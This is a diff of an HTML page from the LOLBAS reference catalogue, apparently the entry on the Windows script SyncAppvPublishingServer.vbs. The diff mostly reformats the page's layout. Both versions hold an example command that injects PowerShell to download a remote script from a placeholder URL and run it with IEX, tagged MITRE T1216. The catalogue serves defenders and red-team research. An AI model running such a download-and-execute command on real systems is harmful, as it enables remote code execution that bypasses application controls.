@@ -28,15 +28,19 @@
     </div>
 </h1>
 
-
 <ul class="function-list">
-    
-    
-    <li><a href="/lolbas/Scripts/Syncappvpublishingserver/#execute">Execute</a></li>
-    
+	
+	
+	
+	<li><a href="/lolbas/Scripts/Syncappvpublishingserver/#execute">Execute</a></li>
+	
 </ul>
 
+	
+
 <p>Script used related to app-v and publishing server</p>
+
+
 
 <br>
 <p><b>Paths:</b> 
@@ -48,64 +52,56 @@
 </p>
 <br>
 <b>Resources:</b> 	
-	<ul style="list-style-type:none">
+<br>
 	
-	<li><a href="https://twitter.com/monoxgas/status/895045566090010624">https://twitter.com/monoxgas/status/895045566090010624</a></li>
+	<a href="https://twitter.com/monoxgas/status/895045566090010624">https://twitter.com/monoxgas/status/895045566090010624</a>
+	<br>
 	
-	<li><a href="https://twitter.com/subTee/status/855738126882316288">https://twitter.com/subTee/status/855738126882316288</a></li>
+	<a href="https://twitter.com/subTee/status/855738126882316288">https://twitter.com/subTee/status/855738126882316288</a>
+	<br>
 	 
-	</ul>
 <br>
 <p><b>Acknowledgement:</b> 
-	<ul style="list-style-type:none">
+<br>
 	
-	<li>Nick Landers - <a href="https://twitter.com/@monoxgas">@monoxgas</a </li>
+	Nick Landers - <a href="https://twitter.com/@monoxgas">@monoxgas</a>
+	<br>
 	
-	<li>Casey Smith - <a href="https://twitter.com/@subtee">@subtee</a </li>
+	Casey Smith - <a href="https://twitter.com/@subtee">@subtee</a>
+	<br>
 	 
-	</ul>
 </p>
 <br>
-<p><b>Detection:</b> 
-	<ul style="list-style-type:none">
+<p><b>Detection:</b>
+<br>
 	
-	<li></li>
+	
+	<br>
 	 
-	</ul>
 </p>
 <br>
 <br>
 
 
 
-
-
-
-<h2 id="execute" class="function-name">Execute</h2>
-
-<p>The LOLBAS can achieve abritrary code execution.</p>
-
-
-<ul class="examples">
-
-    
-
-
-
-    <li>
-        <p>Inject PowerShell script code with the provided arguments</p>
-
+	
+<h2 id="execute" class ="function-name">Execute</h2>
+	
+		Inject PowerShell script code with the provided arguments
+		<br>
+		<pre><code>SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"</code></pre>
 		Usecase:Use Powershell host invoked from vbs script
-        <pre><code>SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"</code></pre>
-    </li>
-	<li>Privileges required:User</li>
-	<li>OS:Windows 10</li>
-	<li>Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1216">T1216</a></li>
-	<br><br>	
-    
-
-</ul>
-<br><br>
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1216">T1216</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
 
         <script>
          // add permalink on headings
